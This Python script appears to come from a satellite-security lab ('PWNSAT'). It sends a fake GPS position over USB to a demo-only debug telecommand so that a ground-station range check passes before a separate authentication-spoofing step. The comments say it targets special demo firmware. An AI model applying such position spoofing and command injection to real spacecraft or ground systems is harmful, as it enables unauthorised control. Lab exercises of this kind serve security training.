#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# 00_gps_override_prereq_usb.py -- USB port of this attack's GPS prerequisite
# step. commandGroundStationAccessHandler() requires groundStationGpsUsable()
# AND groundStationWithinRange() before either GS_ACCESS handshake phase runs
# (see 05_gs_auth_spoofing_rf.py's "PREREQUISITE -- GPS RANGE GATE"). This
# injects a fake position via the DEMO-ONLY debug hook
# (SPP_APID_TC_GPS_OVERRIDE, 0x14, requires firmware/gps-debug-demo/ flashed)
# so that gate is satisfied before running 05_gs_auth_spoofing_usb.py.
#
# Same defaults as 00_gps_override_prereq_rf.py, over USB instead of HackRF.
#
# Payload (13 bytes, matches commandGpsOverrideHandler() in worker.cpp):
#   lat_e7 (int32 LE), lon_e7 (int32 LE), alt_cm (int32 LE), satellites (u8)

import argparse
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "lib"))

from flatsat_usb import FlatSatUSB  # noqa: E402

GPS_OVERRIDE_APID = 0x14

# Area 51 (Groom Lake) -- same default as the RF prereq. Whether it lands
# inside the ground station's 35km range gate depends on the firmware's
# hardcoded GS coordinates; override with --lat/--lon/--alt as needed.
DEFAULT_LAT = 37.2431
DEFAULT_LON = -115.7930
DEFAULT_ALT_M = 1360.0
DEFAULT_SATS = 10


def build_gps_override_payload(lat: float, lon: float, alt_m: float, sats: int) -> bytes:
    lat_e7 = int(round(lat * 1e7))
    lon_e7 = int(round(lon * 1e7))
    alt_cm = int(round(alt_m * 100))
    return (
        lat_e7.to_bytes(4, "little", signed=True)
        + lon_e7.to_bytes(4, "little", signed=True)
        + alt_cm.to_bytes(4, "little", signed=True)
        + bytes([sats & 0xFF])
    )


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--lat", type=float, default=DEFAULT_LAT,
                        help=f"fake latitude, decimal degrees (default {DEFAULT_LAT}, Area 51)")
    parser.add_argument("--lon", type=float, default=DEFAULT_LON,
                        help=f"fake longitude, decimal degrees (default {DEFAULT_LON})")
    parser.add_argument("--alt", type=float, default=DEFAULT_ALT_M,
                        help=f"fake altitude, meters (default {DEFAULT_ALT_M})")
    parser.add_argument("--sats", type=int, default=DEFAULT_SATS,
                        help=f"fake satellite count to report (default {DEFAULT_SATS})")
    parser.add_argument("--seq", type=int, default=1, help="starting SPP sequence count")
    parser.add_argument("--port", default=None,
                        help="serial port for the USBRadioLink (default: autodetect)")
    parser.add_argument("--quiet", action="store_true")
    args = parser.parse_args()

    print("=" * 66)
    print("PWNSAT GS auth spoofing -- STEP 0: GPS prerequisite (USB, debug hook)")
    print("Requires firmware/gps-debug-demo/ flashed -- this command does not")
    print("exist in the real New-firmware/ build.")
    print(f"Target: lat={args.lat} lon={args.lon} alt={args.alt}m sats={args.sats}")
    print("=" * 66)

    payload = build_gps_override_payload(args.lat, args.lon, args.alt, args.sats)

    with FlatSatUSB(port=args.port, encrypt=True, verbose=not args.quiet) as fsat:
        fsat.send_raw_tc(GPS_OVERRIDE_APID, payload, seq=args.seq, listen_seconds=1.0)

    print("[+] Sent over USB. Run 05_gs_auth_spoofing_usb.py next -- this step only "
          "sets the position, it does not touch GS_ACCESS at all.")


if __name__ == "__main__":
    main()
